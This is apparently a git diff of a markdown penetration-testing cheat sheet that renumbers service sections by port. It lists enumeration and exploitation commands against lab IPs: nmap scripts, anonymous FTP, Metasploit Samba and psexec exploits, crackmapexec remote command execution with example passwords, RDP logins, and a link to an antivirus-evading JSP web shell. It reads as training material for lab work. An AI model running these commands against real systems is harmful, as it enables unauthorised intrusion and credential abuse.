@@ -78,6 +78,41 @@
 
 ### [ENUMERATING & EXPLOITING SERVICES](#)
 
+#### 21.FTP
+
+- [ ] Version: Check for FTP Version (ProFTPD, VSFTPD etc..) (If it is vulnerable)
+    - `nmap 192.60.4.3 -sV -p 21`
+
+- [ ] Anonymous login: Check if FTP Anonymous login is allowed
+    - `ftp 192.60.4.3 ` (provide blank password)
+    - `nmap 192.176.71.3 -p 21 --script ftp-anon`
+
+- FTP connection - `ftp 192.60.4.3 `
+- Uploading and Downloading files
+    - ftp> `get secret.txt`
+
+#### 22.SSH
+
+- OpenSSH version 
+    - `nmap 192.238.103.3 -p 22 -sV -O`
+    - `nc 192.238.103.3 22`
+- Checking if Authentication is required and Type of Authentication supported
+    - `nmap 192.238.103.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=student"`
+- Encryption Algorithm for key supported by SSH server
+    - `nmap 192.238.103.3 -p 22 --script ssh2-enum-algos`
+- Checking ssh-hostkey ie the public key on server
+    - `nmap 192.238.103.3 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full`
+
+- SSH connection 
+    - `ssh root@192.238.103.3`
+    - `ssh 192.168.204.134 -okexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-dss -c aes128-cbc`
+    - `ssh -i ssh-key user@192.168.204.132 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa`
+
+
+#### 25.SMTP
+#### 53.DNS
+
+
 #### **General Web Recon**
 
 - DNS Enumeration
@@ -104,7 +139,7 @@
     - `gobuster -u http://10.10.93.218/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt dir `
     - `use auxiliary/scanner/http/brute_dirs` / `use auxiliary/scanner/http/dir_scanner`
 
-#### HTTP
+#### 80.HTTP
 
 - Server Banner and version
     - `use auxiliary/scanner/http/http_version`
@@ -313,42 +348,9 @@ Here’s an example `web.xml` file.
         - https://github.com/SecurityRiskAdvisors/cmd.jsp
         - The web shell as is only gets detected by 2/58 anti-virus vendors.
 
-###### Tomcat
+#### 161.SNMP
 
-
-
-#### FTP
-
-- [ ] Version: Check for FTP Version (ProFTPD, VSFTPD etc..) (If it is vulnerable)
-    - `nmap 192.60.4.3 -sV -p 21`
-
-- [ ] Anonymous login: Check if FTP Anonymous login is allowed
-    - `ftp 192.60.4.3 ` (provide blank password)
-    - `nmap 192.176.71.3 -p 21 --script ftp-anon`
-
-- FTP connection - `ftp 192.60.4.3 `
-- Uploading and Downloading files
-    - ftp> `get secret.txt`
-
-#### SSH
-
-- OpenSSH version 
-    - `nmap 192.238.103.3 -p 22 -sV -O`
-    - `nc 192.238.103.3 22`
-- Checking if Authentication is required and Type of Authentication supported
-    - `nmap 192.238.103.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=student"`
-- Encryption Algorithm for key supported by SSH server
-    - `nmap 192.238.103.3 -p 22 --script ssh2-enum-algos`
-- Checking ssh-hostkey ie the public key on server
-    - `nmap 192.238.103.3 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full`
-
-- SSH connection 
-    - `ssh root@192.238.103.3`
-    - `ssh 192.168.204.134 -okexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-dss -c aes128-cbc`
-    - `ssh -i ssh-key user@192.168.204.132 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa`
-
-
-#### SAMBA
+#### 445.SAMBA
 
 ##### Enumeration
 
@@ -438,7 +440,7 @@ Here’s an example `web.xml` file.
 - Exploiting Using Metasploit
     - `use exploit/linux/samba/is_known_pipename `
 
-#### SMB
+#### 445.SMB
 
 ##### Enumeration
 
@@ -491,14 +493,14 @@ smb: \> mget *
         - Exploiting flaw using metasploit `PsExec` module
             - `use exploit/windows/smb/psexec` > `set RHOSTS 10.5.22.249` > `set LHOST 10.10.26.2` > `set SMBUSER administrator` > `set SMBPASS qwertyuiop` > `set LPORT 1234` > `exploit`
 
-#### RDP
+#### 3389.RDP
 
 - Connecting RDP
     - `xfreerdp /u:administrator /p:qwertyuiop /v:10.5.31.78:3333`
     - `rdesktop -u 'bitbucket' -p 'littleredbucket' 10.10.125.136:3389`
 
 
-#### WinRM
+#### 5985.WinRM
 
 - Arbitiary command execution
     - `crackmapexec winrm 10.5.27.211 -u administrator -p tinkerbell -x "whoami"` / `crackmapexec winrm 10.5.27.211 -u administrator -p tinkerbell -x "systeminfo"`
@@ -792,7 +794,8 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
             - Syntex
                 - `scp user@remotehost:/home/user/file_name user2@remotehost2.com:/remote/directory`
 
-##### Transfer when you are Pivoted
+##### TRANSFER OPTIONS WHEN YOU ARE PIVOTED
+Evil-weinrm is better option in case you have it open.
 ###### Evil-winrm
 - Uploading via WinRM CLI
     - upload and download
